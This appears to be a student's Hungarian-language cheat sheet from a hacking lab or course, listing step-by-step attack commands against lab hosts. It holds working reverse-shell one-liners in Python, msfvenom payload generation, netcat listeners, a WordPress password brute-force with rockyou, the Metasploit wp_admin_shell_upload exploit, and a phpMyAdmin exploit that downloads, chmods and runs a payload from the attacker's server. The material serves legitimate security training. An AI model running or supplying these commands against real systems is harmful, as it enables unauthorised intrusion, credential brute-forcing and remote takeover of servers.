/usr/share/wordlists/rockyou.txt  

msfvenom -l playloads

// listener
30.0.1.11
nc -lvnp 4444 ugyanazon a porton

// ip cím kiírása
ip a

// fájl csinálás msfvenom
msfvenom -p php/reverse_php LHOST=30.0.1.11 LPORT=4444 -f raw > shell.php

// chain shelling nem php és php esetén
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.11",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.11",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

// php esetén
nc -lvnp 4444 
msfvenom -p php/reverse_php LHOST=30.0.1.11 LPORT=4444 -f raw > shell.php // másik shellbe
chmod +x kriszshell.elf // másik shellbe
./kriszshell.elf listenerbe

// feltérképezés
sudo nmap -sS -sV 40.0.4.10

// egy weblap feltérképezése
dirbuster
/usr/share/wordlists/dirb/common.txt

//wordpress scan
wpscan 
-h
-o output file
-f format
--deteection-mode MODE mennyire erőszakosan próbálja felfedezni az oldalakat
aggresszív mód (jobban észrevesznek) passzív mód, alap beállítás kevert
--user-agent --rua random váltogatja a botokat
--http-auth login:password milyen login password kombóval tudja a wpscan átlépni az oldalt
--throttle milliseconds várakozás kattintás várakozás szimuláció
-e beállíthatjuk mire vagyunk kíváncsiak, 
  -vp vulnerable plugins
  -u user
  -at all themes
  -ap all plugins
-U username listája
  --login-rui URI ha zhn máshol található a login uri https://40.0.4.27 /secret
--stealthy


wpscan --url http://40.0.4.10 -e u,at,ap

wpscan --url http://40.0.4.10 --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
ha < 5k akkor nem jelszót kell brute forceolni

comments.php-t kell szerkeszteni általában

msfconsole //metasploit exploitok msfvenom benne van
msfconsole search wordpress
search wordpress shell
a szám dinamkusan változik
wp admin shell upload
use exploit exploit/unix/webapp/wp_admin_shell_upload
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> options
nézni a yeseket module options
  rportot átírni ahol a website van
  targeturi
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set password finalfantasy
password => finalfantasy
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set rhosts 40.0.4.10
rhosts => 40.0.4.10
[msf](Jobs:0 Agents:0) exploit(unix/webapp/wp_admin_shell_upload) >> set username admin
username => admin
meterpreter> shell
python3 -c "import pty;pty.spawn('/bin/bash')"


msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f raw > metshell.php
msfconsole > use exploit/multi/handler // ez csak listener 
set payload php/meterpreter/reverse_tcp
run // olyan mint a netcates listener

6.gyak
thecartpress 
exploit-db.com
zh-n verzióban feljebb lehet menni de lejebb nem
exploit-dbn vannak x-k, pipák azt jelentik h verifyolta a cég ha pipa van
xss típusú sérülékenység: 
authentikálni kell magam
weboldal "feltörése":
1. ping 40.0.5.10 (gép pingelése)
2. sudo nmap -sS -sV -p 50-3000 40.0.5.10 portokat megnézni
3. dirbuster , megnézzük a response-t (phpmyadmin)
4. view page source (verzió szám megnézése talán)
5. felhasználó / jelszó kombó (pma / pmapass) (lehet default jelszó használat googleon)
6. 
  0.milyen rendszert akarok támadni? Linux 64 bites (systeminfo -> win / uname -a -> linux) zhn minden gép linux 64 bites
  1.a meghatározott rendszertípusra msfvenom-al készítünk egy reverse shellt (ez a saját gépünkön készül) (msfvenom cheatsheet infinitelogins)
    1 fázisú payloadot (stageless) 
    (METERPRETER msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
    (NON METERPRETER msfvenom -p linux/x64/shell_reverse_tcp LHOST=30.0.1.11 LPORT=4444 -f elf > kriszshell.elf)
  2.Célpont keresek egy mappát amin van írási jogom (tmp mappa linuxon, windowson temp) 
    a, belépünk a /tmp mappába a célgépen
    b, kitöröljük az előző / már ott lévő shell(eket)
    c, letöltjük ide a mi gépünkről a shell-t (scp, base64,
      Fájlmásolás Támadóról Cépontra  
      a, támadón belépek abba a mappába ahol a shell/fájl van
      b, python3 -m http.server [PORT] (opcionális a port)
      python3 50457.py 40.0.5.10 80 /phpmyadmin pma pmapass "cd /tmp;rm -rf kriszshell.elf;wget http://30.0.1.11:8000/kriszshell.elf;chmod 777     /tmp/kriszshell.elf;/tmp/kriszshell.elf"
    d, futtathatóvá tesszük a shellt 
    e, listener a saját gépünkön  nc -lvnp 4444
    f, futtatás
python3 -c "import pty;pty.spawn('/bin/bash')"



    
